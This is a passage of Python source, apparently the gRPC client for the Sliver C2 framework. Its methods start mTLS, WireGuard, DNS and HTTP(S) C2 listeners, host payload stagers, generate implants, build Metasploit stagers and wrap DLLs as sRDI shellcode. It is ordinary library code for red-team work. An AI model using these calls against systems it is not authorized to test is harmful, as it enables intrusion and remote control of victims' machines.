    def on_event(self, callback: Callable) -> str:
        '''Register an on Event callback, the callback should accept one argument (the event object).
        This callback will be triggered for any type of event.

        :param callback: The callback function, which should accept one argument
        :type callback: Callable
        :return: The callback ID, which can be used to unregister the callback
        :rtype: str
        '''        
        if self._events_future is None:
            self._init_events()
        callback_id = str(uuid4())
        self._on_event[callback_id] = callback
        return callback_id

    def remove_on_event(self, callback_id: str) -> None:
        '''Remove an on event callback function using it's callback ID

        :param callback_id: The callback ID of the callback function to unregister
        :type callback_id: str
        '''        
        if callback_id in self._on_event:
            self._on_callback_lock.acquire(blocking=True)
            del self._on_event[callback_id]
            self._on_callback_lock.release()

    def on_session(self, callback: Callable) -> str:
        '''Register an on Session callback, the callback should accept one argument (the event object).
        This callback will be triggered for any Session related type of event (e.g. when sessions connect/disconnect).

        :param callback: The callback function, which should accept one argument
        :type callback: Callable
        :return: The callback ID, which can be used to unregister the callback
        :rtype: str
        '''
        if self._events_future is None:
            self._init_events()
        callback_id = str(uuid4())
        self._on_session[callback_id] = callback
        return callback_id

    def remove_on_session(self, callback_id: str) -> None:
        '''Remove an on Session callback function using it's callback ID

        :param callback_id: The callback ID of the callback function to unregister
        :type callback_id: str
        '''   
        if callback_id in self._on_session:
            self._on_callback_lock.acquire(blocking=True)
            del self._on_session[callback_id]
            self._on_callback_lock.release()

    def on_job(self, callback: Callable) -> str:
        '''Register an on Job callback, the callback should accept one argument (the event object).
        This callback will be triggered for any Job related type of event (e.g. when jobs start/stop).

        :param callback: The callback function, which should accept one argument
        :type callback: Callable
        :return: The callback ID, which can be used to unregister the callback
        :rtype: str
        '''
        if self._events_future is None:
            self._init_events()
        callback_id = str(uuid4())
        self._on_job[callback_id] = callback
        return callback_id

    def remove_on_job(self, callback_id: str) -> None:
        '''Remove an on Job callback function using it's callback ID

        :param callback_id: The callback ID of the callback function to unregister
        :type callback_id: str
        '''   
        if callback_id in self._on_job:
            self._on_callback_lock.acquire(blocking=True)
            del self._on_job[callback_id]
            self._on_callback_lock.release()

    def on_canary(self, callback: Callable) -> str:
        '''Register an on Canary callback, the callback should accept one argument (the event object).
        This callback will be triggered for any Canary related type of event (e.g. when a DNS canary is burned).

        :param callback: The callback function, which should accept one argument
        :type callback: Callable
        :return: The callback ID, which can be used to unregister the callback
        :rtype: str
        '''
        if self._events_future is None:
            self._init_events()
        callback_id = str(uuid4())
        self._on_canary[callback_id] = callback
        return callback_id

    def remove_on_canary(self, callback_id: str) -> None:
        '''Remove an on Canary callback function using it's callback ID

        :param callback_id: The callback ID of the callback function to unregister
        :type callback_id: str
        '''   
        if callback_id in self._on_canary:
            self._on_callback_lock.acquire(blocking=True)
            del self._on_canary[callback_id]
            self._on_callback_lock.release()

    #
    # > gRPC Methods
    #
    def version(self, timeout=TIMEOUT) -> client_pb2.Version:
        '''Get server version information

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf Version object
        :rtype: client_pb2.Version
        '''
        return self._stub.GetVersion(common_pb2.Empty(), timeout=timeout)

    def operators(self, timeout=TIMEOUT) -> List[client_pb2.Operator]:
        '''Get a list of operators and their online status

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: List of protobuf Operator objects
        :rtype: List[client_pb2.Operator]
        '''
        operators = self._stub.GetOperators(common_pb2.Empty(), timeout=timeout)
        return list(operators.Operators)

    def sessions(self, timeout=TIMEOUT) -> List[client_pb2.Session]:
        '''Get a list of active sessions

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: List of protobuf Session objects
        :rtype: List[client_pb2.Session]
        '''
        sessions: client_pb2.Sessions = self._stub.GetSessions(common_pb2.Empty(), timeout=timeout)
        return list(sessions.Sessions)

    def update_session(self, session_id: int, name: str, timeout=TIMEOUT) -> client_pb2.Session:
        '''Update a session attribute (such as name)

        :param session_id: Numeric session ID to update
        :type session_id: int
        :param name: Rename session to this value
        :type name: str
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Updated protobuf session object
        :rtype: client_pb2.Session
        '''
        update = client_pb2.UpdateSession()
        update.SessionID = session_id
        update.Name = name
        return self._stub.UpdateSession(update, timeout=timeout)

    def kill_session(self, session_id: int, force=False, timeout=TIMEOUT) -> None:
        '''Kill a session

        :param session_id: The numeric session ID to kill
        :type session_id: int
        :param force: Force kill the session, defaults to False
        :type force: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        '''
        kill = sliver_pb2.KillSessionReq()
        kill.Request.SessionID = session_id
        kill.Request.Timeout = timeout-1
        kill.Force = force
        self._stub.KillSession(kill, timeout=timeout)

    def jobs(self, timeout=TIMEOUT) -> List[client_pb2.Job]:
        '''Get a list of active jobs

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: List of protobuf Job objects
        :rtype: List[client_pb2.Job]
        '''   
        jobs: client_pb2.Jobs = self._stub.GetJobs(common_pb2.Empty(), timeout=timeout)
        return list(jobs.Jobs)

    def kill_job(self, job_id: int, timeout=TIMEOUT) -> client_pb2.KillJob:
        '''Kill a job

        :param job_id: Numeric job ID to kill
        :type job_id: int
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf KillJob object
        :rtype: client_pb2.KillJob
        '''
        kill = client_pb2.KillJobReq()
        kill.ID = job_id
        return self._stub.KillJob(kill, timeout=timeout)

    def start_mtls_listener(self, host: str, port: int, persistent=False, timeout=TIMEOUT) -> client_pb2.MTLSListener:
        '''Start a mutual TLS (mTLS) C2 listener

        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf MTLSListener object
        :rtype: client_pb2.MTLSListener
        '''
        mtls = client_pb2.MTLSListenerReq()
        mtls.Host = host
        mtls.Port = port
        mtls.Persistent = persistent
        return self._stub.StartMTLSListener(mtls, timeout=timeout)

    def start_wg_listener(self, port: int, tun_ip: str, n_port: int, key_port: int, persistent=False, timeout=TIMEOUT) -> client_pb2.WGListener:
        '''Start a WireGuard (wg) C2 listener

        :param port: UDP port to start listener on
        :type port: int
        :param tun_ip: Virtual TUN IP listen address
        :type tun_ip: str
        :param n_port: Virtual TUN port number
        :type n_port: int
        :param key_port: Virtual TUN port number for key exchanges
        :type key_port: int
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf WGListener object
        :rtype: client_pb2.WGListener
        '''
        wg = client_pb2.WGListenerReq()
        wg.Port = port
        wg.TunIP = tun_ip
        wg.NPort = n_port
        wg.KeyPort = key_port
        wg.Persistent = persistent
        return self._stub.StartWGListener(wg, timeout=timeout)

    def start_dns_listener(self, domains: List[str], canaries: bool, host: str, port: int, persistent=False, timeout=TIMEOUT) -> client_pb2.DNSListener:
        '''Start a DNS C2 listener

        :param domains: C2 domains to listen for
        :type domains: List[str]
        :param canaries: Enable/disable DNS canaries
        :type canaries: bool
        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf DNSListener object
        :rtype: client_pb2.DNSListener
        '''
        dns = client_pb2.DNSListenerReq()
        dns.Domains.extend(domains)
        dns.Canaries = canaries
        dns.Host = host
        dns.Port = port
        dns.Persistent = persistent
        return self._stub.StartDNSListener(dns, timeout=timeout)

    def start_https_listener(self, domain: str, host: str, port: int, secure: bool, website: str, cert: bytes, key: bytes, acme: bool, persistent=False, timeout=TIMEOUT) -> client_pb2.HTTPListener:
        '''Start an HTTPS C2 listener

        :param domain: Domain name for HTTPS server (one domain per listener)
        :type domain: str
        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param website: Name of the "website" to host on listener
        :type website: str
        :param cert: TLS certificate (leave blank to generate self-signed certificate)
        :type cert: bytes
        :param key: TLS private key (leave blank to generate self-signed certificate)
        :type key: bytes
        :param acme: Automatically provision TLS certificate using ACME (i.e., Let's Encrypt)
        :type acme: bool
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf HTTPListener object (NOTE: HTTP/HTTPS both return HTTPListener objects)
        :rtype: client_pb2.HTTPListener
        '''
        http = client_pb2.HTTPListenerReq()
        http.Domain = domain
        http.Host = host
        http.Port = port
        http.Secure = secure
        http.Website = website
        http.Cert = cert
        http.Key = key
        http.ACME = acme
        http.Persistent = persistent
        return self._stub.StartHTTPListener(http, timeout=timeout)

    def start_http_listener(self, domain: str, host: str, port: int, secure: bool, website: str, persistent=False, timeout=TIMEOUT) -> client_pb2.HTTPListener:
        '''Start an HTTP C2 listener

        :param domain: Domain name for HTTP server (one domain per listener)
        :type domain: str
        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param website: Name of the "website" to host on listener
        :type website: str
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf HTTPListener object (NOTE: HTTP/HTTPS both return HTTPListener objects)
        :rtype: client_pb2.HTTPListener
        '''
        http = client_pb2.HTTPListenerReq()
        http.Domain = domain
        http.Host = host
        http.Port = port
        http.Secure = False
        http.Website = website
        http.ACME = False
        http.Persistent = persistent
        return self._stub.StartHTTPListener(http, timeout=timeout)

    def start_tcp_stager_listener(self, protocol: client_pb2.StageProtocol, host: str, port: int, data: bytes, timeout=TIMEOUT) -> client_pb2.StagerListener:
        '''Start a TCP stager listener

        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param data: Binary data of stage to host on listener
        :type data: bytes
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf StagerListener object
        :rtype: client_pb2.StagerListener
        '''
        stage = client_pb2.StagerListenerReq()
        stage.Protocol = protocol
        stage.Host = host
        stage.Port = port
        stage.Data = data
        return self._stub.StartTCPStagerListener(stage, timeout=timeout)

    def start_http_stager_listener(self, protocol: client_pb2.StageProtocol, host: str, port: int, data: bytes, cert: bytes, key: bytes, acme: bool, timeout=TIMEOUT) -> client_pb2.StagerListener:
        '''Start an HTTP(S) stager listener

        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param data: Binary data of stage to host on listener
        :type data: bytes
        :param cert: TLS certificate, leave blank to start listener as HTTP
        :type cert: bytes
        :param key: TLS key, leave blank to start listener as HTTP
        :type key: bytes
        :param acme: Automatically provision TLS certificate using ACME (i.e., Let's Encrypt)
        :type acme: bool
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf StagerListener object
        :rtype: client_pb2.StagerListener
        '''
        stage = client_pb2.StagerListenerReq()
        stage.Protocol = protocol
        stage.Host = host
        stage.Port = port
        stage.Data = data
        stage.Cert = cert
        stage.Key = key
        stage.ACME = acme
        return self._stub.StartHTTPStagerListener(stage, timeout=timeout)

    def generate(self, config: client_pb2.ImplantConfig, timeout=360) -> client_pb2.Generate:
        '''Generate a new implant using a given configuration

        :param config: Protobuf ImplantConfig object
        :type config: client_pb2.ImplantConfig
        :param timeout: gRPC timeout, defaults to 360
        :type timeout: int, optional
        :return: Protobuf Generate object containing the generated implant
        :rtype: client_pb2.Generate
        '''
        req = client_pb2.GenerateReq()
        req.ImplantConfig = config
        return self._stub.Generate(req, timeout=timeout)

    def regenerate(self, implant_name: str, timeout=TIMEOUT) -> client_pb2.Generate:
        '''Regenerate an implant binary given the implants "name"

        :param implant_name: The name of the implant to regenerate
        :type implant_name: str
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf Generate object
        :rtype: client_pb2.Generate
        '''
        regenerate = client_pb2.RegenerateReq()
        regenerate.ImpantName = implant_name
        return self._stub.Regenerate(regenerate, timeout=timeout)

    def implant_builds(self, timeout=TIMEOUT) -> Dict[str, client_pb2.ImplantConfig]:
        '''Get information about historical implant builds

        :return: Protobuf Map object, the keys are implant names the values are implant configs
        :rtype: Dict[str, client_pb2.ImplantConfig]
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        '''
        builds: client_pb2.ImplantBuilds = self._stub.ImplantBuilds(common_pb2.Empty(), timeout=timeout)
        return builds.Configs

    def delete_implant_build(self, implant_name: str, timeout=TIMEOUT) -> None:
        '''Delete a historical implant build from the server by name

        :param implant_name: The name of the implant build to delete
        :type implant_name: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        '''        
        delete = client_pb2.DeleteReq()
        delete.Name = implant_name
        self._stub.DeleteImplantBuild(delete, timeout=timeout)
    
    def canaries(self, timeout=TIMEOUT) -> List[client_pb2.DNSCanary]:
        '''Get a list of canaries that have been generated during implant builds, includes metadata about those canaries

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: List of Protobuf DNSCanary objects
        :rtype: List[client_pb2.DNSCanary]
        '''        
        canaries = self._stub.Canaries(common_pb2.Empty(), timeout=timeout)
        return list(canaries.Canaries)
    
    def generate_wg_client_config(self, timeout=TIMEOUT) -> client_pb2.WGClientConfig:
        '''Generate a new WireGuard client configuration files

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf WGClientConfig object
        :rtype: client_pb2.WGClientConfig
        '''        
        return self._stub.GenerateWGClientConfig(common_pb2.Empty(), timeout=timeout)

    def generate_unique_ip(self, timeout=TIMEOUT) -> client_pb2.UniqueWGIP:
        '''Generate a unique IP address for use with WireGuard

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf UniqueWGIP object
        :rtype: client_pb2.UniqueWGIP
        '''        
        return self._stub.GenerateUniqueIP(common_pb2.Empty(), timeout=timeout)
    
    def implant_profiles(self, timeout=TIMEOUT) -> List[client_pb2.ImplantProfile]:
        '''Get a list of all implant configuration profiles on the server

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: List of Protobuf ImplantProfile objects
        :rtype: List[client_pb2.ImplantProfile]
        '''        
        profiles = self._stub.ImplantProfiles(common_pb2.Empty(), timeout=timeout)
        return list(profiles.Profiles)
    
    def delete_implant_profile(self, profile_name: str, timeout=TIMEOUT) -> None:
        '''Delete an implant configuration profile by name

        :param profile_name: Name of the profile to delete
        :type profile_name: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        '''        
        delete = client_pb2.DeleteReq()
        delete.Name = profile_name
        self._stub.DeleteImplantProfile(delete, timeout=timeout)
    
    def save_implant_profile(self, profile: client_pb2.ImplantProfile, timeout=TIMEOUT) -> client_pb2.ImplantProfile:
        '''Save an implant configuration profile to the server

        :param profile: An implant configuration profile (a Protobuf ImplantProfile object)
        :type profile: client_pb2.ImplantProfile
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf ImplantProfile object
        :rtype: client_pb2.ImplantProfile
        '''        
        return self._stub.SaveImplantProfile(profile, timeout=timeout)
    
    def msf_stage(self, arch: str, format: str, host: str, port: int, os: str, protocol: client_pb2.StageProtocol, badchars=[], timeout=TIMEOUT) -> client_pb2.MsfStager:
        '''Create a Metasploit (if available on the server) stager

        :param arch: CPU architecture
        :type arch: str
        :param format: Binary format (MSF)
        :type format: str
        :param host: LHOST (MSF)
        :type host: str
        :param port: LPORT (MSF)
        :type port: int
        :param os: Operating System (MSF)
        :type os: str
        :param protocol: Starger protocol (Protobuf StageProtocol object)
        :type protocol: client_pb2.StageProtocol
        :param badchars: Bad characters, defaults to []
        :type badchars: list, optional
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf MsfStager object
        :rtype: client_pb2.MsfStager
        '''        
        stagerReq = client_pb2.MsfStagerReq()
        stagerReq.Arch = arch
        stagerReq.Format = format
        stagerReq.Port = port
        stagerReq.Host = host
        stagerReq.OS = os
        stagerReq.Protocol = protocol
        stagerReq.BadChars = badchars
        return self._stub.MsfStage(stagerReq, timeout=timeout)

    def shellcode_rdi(self, data: bytes, function_name: str, arguments: str, timeout=TIMEOUT) -> client_pb2.ShellcodeRDI:
        '''Generate sRDI shellcode

        :param data: The DLL file to wrap in an sRDI shellcode loader
        :type data: bytes
        :param function_name: Function to call on the DLL
        :type function_name: str
        :param arguments: Arguments to the function called
        :type arguments: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf ShellcodeRDI object
        :rtype: client_pb2.ShellcodeRDI
        '''        
        shellReq = client_pb2.ShellcodeRDIReq()
        shellReq.Data = data
        shellReq.FunctionName = function_name
        shellReq.Arguments = arguments
        return self._stub.ShellcodeRDI(shellReq, timeout=timeout)

    def websites(self, timeout=TIMEOUT) -> List[client_pb2.Website]:
        '''Get a list of websites

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: List of Protobuf Website objects
        :rtype: List[client_pb2.Website]
        '''        
        websites = self._stub.Websites(common_pb2.Empty(), timeout=timeout)
        return list(websites.Websites)
    
    def website(self, website: client_pb2.Website, timeout=TIMEOUT) -> client_pb2.Website:
        '''Update an entire website object on the server

        :param website: The updated Protobuf Website object
        :type website: client_pb2.Website
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        return self._stub.Websites(website, timeout=timeout)

    def website_remove(self, name: str, timeout=TIMEOUT) -> None:
        '''Remove an entire website and its content

        :param name: The name of the website to remove
        :type name: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        '''
        website = client_pb2.Website()
        website.Name = name
        self._stub.Websites(website, timeout=timeout)

    def website_add_content(self, name: str, web_path: str, content_type: str, content: bytes, timeout=TIMEOUT) -> client_pb2.Website:
        '''Add content to a specific website

        :param name: Name of the website to add the content to
        :type name: str
        :param web_path: Bind content to web path
        :type web_path: str
        :param content_type: Specify the Content-type response HTTP header
        :type content_type: str
        :param content: The raw response content
        :type content: bytes
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        web = client_pb2.WebContent()
        web.Path = web_path
        web.ContentType = content_type
        web.Content = content
        web.Size = len(content)
        add = client_pb2.WebsiteAddContent()
        add.Name = name
        add.Content[web_path] = web
        return self._stub.WebsiteAddContent(add, timeout=timeout)

    def website_update_content(self, name: str, web_path: str, content_type: str, content: bytes, timeout=TIMEOUT) -> client_pb2.Website:
        '''Update content on a specific website / web path

        :param name: Name of the website to add the content to
        :type name: str
        :param web_path: Bind content to web path
        :type web_path: str
        :param content_type: Specify the Content-type response HTTP header
        :type content_type: str
        :param content: The raw response content
        :type content: bytes
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        web = client_pb2.WebContent()
        web.Path = web_path
        web.ContentType = content_type
        web.Content = content
        web.Size = len(content)
        add = client_pb2.WebsiteAddContent()
        add.Name = name
        add.Content[web_path] = web
        return self._stub.WebsiteUpdateContent(add, timeout=timeout)

    def website_rm_content(self, name: str, paths: List[str], timeout=TIMEOUT) -> client_pb2.Website:
        '''Remove content from a specific website

        :param name: The name of the website from which to remove the content
        :type name: str
        :param paths: A list of paths to content that should be removed from the website
        :type paths: List[str]
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        web = client_pb2.WebsiteRemoveContent()
        web.Name = name
        web.Paths.extend(paths)
        return self._stub.WebsiteRemoveContent(web, timeout=timeout)